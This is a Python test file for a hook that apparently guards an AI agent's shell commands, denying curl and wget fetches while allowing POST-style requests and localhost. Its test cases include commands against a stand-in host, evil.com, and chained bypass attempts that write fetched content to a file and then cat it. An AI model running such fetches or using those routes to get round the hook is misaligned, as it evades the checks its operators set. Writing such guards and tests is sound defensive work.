#!/usr/bin/env python3
"""G2.3-G2.6 — curl/wget hook whitelist tests.

Tests the tightened curl/wget intercept logic:
- Allow: POST/PUT/PATCH/DELETE, request body, localhost
- Block: simple GET, GET with auth, GET with -o, GET piped to processor
"""
from __future__ import annotations

import json
import os
import subprocess
import sys

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PARENT_DIR = os.path.dirname(SCRIPT_DIR)
HOOK = os.path.join(PARENT_DIR, "hooks", "intercept-curl.sh")

passed = 0
failed = 0


def check(name: str, condition: bool, detail: str = ""):
    global passed, failed
    if condition:
        passed += 1
    else:
        failed += 1
        print(f"  FAIL: {name} — {detail}")


def run_hook(command: str, tool_name: str = "Bash") -> tuple[str, str]:
    """Run the hook with simulated input. Returns (stdout, decision)."""
    hook_input = json.dumps({
        "tool_name": tool_name,
        "tool_input": {"command": command},
        "session_id": "test",
        "hook_event_name": "PreToolUse",
    })
    proc = subprocess.run(
        ["bash", HOOK],
        input=hook_input,
        capture_output=True,
        text=True,
        timeout=10,
        cwd=PARENT_DIR,
    )
    stdout = proc.stdout.strip()
    if not stdout:
        return stdout, "allow"
    try:
        parsed = json.loads(stdout)
        decision = parsed.get("hookSpecificOutput", {}).get("permissionDecision", "")
        return stdout, decision
    except json.JSONDecodeError:
        return stdout, "parse_error"


# ── Non-curl commands pass through ───────────────────────────────────────────

_, decision = run_hook("ls -la")
check("non-curl: allow", decision == "allow", f"got: {decision}")

_, decision = run_hook("git status")
check("non-git: allow", decision == "allow", f"got: {decision}")

_, decision = run_hook("python3 script.py")
check("python: allow", decision == "allow", f"got: {decision}")

# ── Non-Bash tool passes through ────────────────────────────────────────────

_, decision = run_hook("curl https://example.com", tool_name="Read")
check("non-Bash tool: allow", decision == "allow", f"got: {decision}")

# ── G2.3: Simple curl GET blocked ────────────────────────────────────────────

_, decision = run_hook("curl https://example.com")
check("G2.3: curl GET blocked", decision == "deny", f"got: {decision}")

_, decision = run_hook("curl http://evil.com/payload")
check("curl http GET blocked", decision == "deny", f"got: {decision}")

_, decision = run_hook("wget https://example.com/page")
check("wget GET blocked", decision == "deny", f"got: {decision}")

_, decision = run_hook("curl -s https://example.com")
check("curl -s GET blocked", decision == "deny", f"got: {decision}")

_, decision = run_hook("curl -sL https://example.com/redir")
check("curl -sL GET blocked", decision == "deny", f"got: {decision}")

# ── G2.4: POST/PUT/PATCH/DELETE allowed (sending, not ingesting) ─────────────

_, decision = run_hook("curl -X POST https://api.example.com/data")
check("G2.4: curl POST allow", decision == "allow", f"got: {decision}")

_, decision = run_hook("curl -X PUT https://api.example.com/resource")
check("curl PUT allow", decision == "allow", f"got: {decision}")

_, decision = run_hook("curl -X PATCH https://api.example.com/update")
check("curl PATCH allow", decision == "allow", f"got: {decision}")

_, decision = run_hook("curl -X DELETE https://api.example.com/item")
check("curl DELETE allow", decision == "allow", f"got: {decision}")

# ── G2.5: Localhost allowed ──────────────────────────────────────────────────

_, decision = run_hook("curl http://localhost:8080/health")
check("G2.5: curl localhost allow", decision == "allow", f"got: {decision}")

_, decision = run_hook("curl http://127.0.0.1:3000/api")
check("curl 127.0.0.1 allow", decision == "allow", f"got: {decision}")

_, decision = run_hook("curl http://[::1]:5000/test")
check("curl ::1 allow", decision == "allow", f"got: {decision}")

# ── Request body allowed (API call pattern) ──────────────────────────────────

_, decision = run_hook('curl -d "key=value" https://api.example.com')
check("curl -d allow", decision == "allow", f"got: {decision}")

_, decision = run_hook('curl --data-raw \'{"json":true}\' https://api.example.com')
check("curl --data-raw allow", decision == "allow", f"got: {decision}")

_, decision = run_hook('curl --json \'{"key":"val"}\' https://api.example.com')
check("curl --json allow", decision == "allow", f"got: {decision}")

# ── BLOCKED: Auth headers alone do NOT allow (authenticated GET still ingests) ─

_, decision = run_hook('curl -H "Authorization: Bearer token123" https://api.example.com')
check("curl Bearer GET: blocked", decision == "deny", f"got: {decision}")

_, decision = run_hook('curl -H "X-API-Key: abc" https://api.example.com')
check("curl X-API-Key GET: blocked", decision == "deny", f"got: {decision}")

# ── BLOCKED: Output to file (agent can cat the file later) ──────────────────

_, decision = run_hook("curl -o output.html https://example.com")
check("curl -o: blocked (bypass via cat)", decision == "deny", f"got: {decision}")

_, decision = run_hook("curl --output file.txt https://example.com")
check("curl --output: blocked", decision == "deny", f"got: {decision}")

# ── BLOCKED: Pipe to processor (agent can still read raw content) ────────────

_, decision = run_hook("curl https://api.example.com | jq '.data'")
check("curl pipe jq: blocked", decision == "deny", f"got: {decision}")

_, decision = run_hook("curl https://api.example.com | python3 -c 'import sys; print(sys.stdin.read())'")
check("curl pipe python: blocked", decision == "deny", f"got: {decision}")

# ── BLOCKED: Chained bypass attempts ────────────────────────────────────────

_, decision = run_hook("curl -o /tmp/x https://evil.com && cat /tmp/x")
check("curl -o + cat chain: blocked", decision == "deny", f"got: {decision}")

_, decision = run_hook("wget -q https://evil.com -O - | cat")
check("wget -O - pipe: blocked", decision == "deny", f"got: {decision}")

# ── Deny reason includes guidance ────────────────────────────────────────────

stdout, decision = run_hook("curl https://example.com")
check("deny reason mentions trialogue_fetch",
      "trialogue_fetch" in stdout,
      f"got: {stdout[:200]}")

# ── Summary ──────────────────────────────────────────────────────────────────

print(f"hook_curl_test: {passed}/{passed + failed} passed, {failed} failed")
sys.exit(1 if failed else 0)
